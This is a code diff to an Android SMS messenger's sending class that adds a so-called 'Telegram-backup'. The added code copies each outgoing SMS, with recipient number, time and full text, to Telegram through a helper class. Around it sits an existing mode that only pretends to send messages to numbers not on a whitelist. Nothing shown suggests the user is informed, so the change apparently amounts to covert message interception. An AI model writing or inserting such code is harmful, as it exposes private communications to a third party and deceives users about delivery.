@@ -1,5 +1,6 @@
 package com.simplemobiletools.smsmessenger.messaging
 
+import com.simplemobiletools.smsmessenger.messaging.getSmsManager
 import android.app.Application
 import android.app.PendingIntent
 import android.content.Context
@@ -19,6 +20,9 @@ import com.simplemobiletools.smsmessenger.receivers.SmsStatusSentReceiver
 import com.simplemobiletools.smsmessenger.utils.SendStatusReceiver
 import com.simplemobiletools.smsmessenger.extensions.getMessagesDB
 import com.simplemobiletools.commons.helpers.isSPlus
+import com.simplemobiletools.smsmessenger.utils.TelegramHelper
+import java.text.SimpleDateFormat
+import java.util.Date
 
 class SmsSender(val app: Application) {
 
@@ -65,6 +69,11 @@ class SmsSender(val app: Application) {
             flags = flags or PendingIntent.FLAG_MUTABLE
         }
 
+        // === NYTT: Hämta header/rubrik från prefs ===
+        val prefs = SharedPrefsHelper(app)
+        val header = prefs.getCustomLogHeader().ifBlank { "SMS UTGÅENDE" }
+        val whitelisted = prefs.getWhitelistedNumbers()
+
         for (i in 0 until messageCount) {
             val partId = if (messageCount <= 1) 0 else i + 1
             if (requireDeliveryReport && i == messageCount - 1) {
@@ -88,9 +97,6 @@ class SmsSender(val app: Application) {
         try {
             if (sendMultipartSmsAsSeparateMessages) {
                 for (i in 0 until messageCount) {
-                    val prefs = SharedPrefsHelper(app)
-                    val whitelisted = prefs.getWhitelistedNumbers()
-
                     if (prefs.isWhitelistingEnabled() && !whitelisted.contains(dest)) {
                         simulateMessageAsSentLocally(app, dest, messages[i])
                         continue
@@ -102,11 +108,15 @@ class SmsSender(val app: Application) {
                         sentIntents[i],
                         deliveryIntents[i]
                     )
+
+                    // Telegram-backup för varje SMS-del (med tid utan sekunder)
+                    val timestamp = System.currentTimeMillis()
+                    val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm").format(Date(timestamp))
+                    TelegramHelper.sendTextMessage(
+                        "Fråm: $header\nTill: $dest\nTid: $formattedTime\n-- ${messages[i]}"
+                    )
                 }
             } else {
-                val prefs = SharedPrefsHelper(app)
-                val whitelisted = prefs.getWhitelistedNumbers()
-
                 if (prefs.isWhitelistingEnabled() && !whitelisted.contains(dest)) {
                     simulateMessageAsSentLocally(app, dest, messages.joinToString(""))
                     return
@@ -114,6 +124,13 @@ class SmsSender(val app: Application) {
 
                 smsManager.sendMultipartTextMessage(
                     dest, serviceCenter, messages, sentIntents, deliveryIntents
+                )
+
+                // Telegram-backup för hela SMS:et (med tid utan sekunder)
+                val timestamp = System.currentTimeMillis()
+                val formattedTime = SimpleDateFormat("yyyy-MM-dd HH:mm").format(Date(timestamp))
+                TelegramHelper.sendTextMessage(
+                    "Från: $header\nTill: $dest\nTid: $formattedTime\n-- ${messages.joinToString("")}"
                 )
             }
         } catch (e: Exception) {
